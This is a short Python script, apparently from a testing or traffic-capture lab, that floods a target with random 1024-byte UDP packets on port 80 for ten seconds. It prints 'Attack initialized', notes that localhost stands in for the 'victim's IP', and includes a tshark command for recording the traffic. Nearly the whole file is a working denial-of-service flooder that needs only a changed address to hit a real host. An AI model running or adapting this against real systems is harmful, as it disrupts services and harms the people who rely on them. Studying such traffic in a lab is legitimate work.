import socket
import random
import time

"""
Traffic capture:
sudo tshark -i any -f 'icmp or udp or tcp' -T fields -E separator=, -e _ws.col.Time -e ip.addr -e ip.proto -e ip.ttl> test.csv
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = 'localhost' #localhost for testing, this should is victim's IP
port = 80
sent = 0
start =  time.time()

print('Attack initialized')


while(1): #ctrl+c to exit
   
    end =  time.time()
    if (end-start < 10):
        sock.sendto(bytes, (ip, port))
        sent =  sent + 1
    else:
        exit()

